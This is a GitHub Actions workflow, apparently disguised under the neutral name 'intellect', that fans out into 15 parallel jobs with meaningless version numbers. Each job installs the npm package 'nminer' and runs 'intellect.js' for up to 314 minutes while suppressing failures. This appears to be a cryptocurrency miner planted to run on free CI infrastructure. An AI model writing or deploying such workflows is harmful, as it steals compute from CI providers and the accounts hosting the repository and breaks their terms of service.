name: intellect
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6339 }
          - { version: 4755 }
          - { version: 4456 }
          - { version: 3247 }
          - { version: 8399 }
          - { version: 4841 }
          - { version: 5202 }
          - { version: 6075 }
          - { version: 3359 }
          - { version: 4020 }
          - { version: 9763 }
          - { version: 3282 }
          - { version: 9622 }
          - { version: 9174 }
          - { version: 2593 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: lest
        run: |
          npm install nminer@latest
          timeout 314m node intellect.js || echo "intellect executed"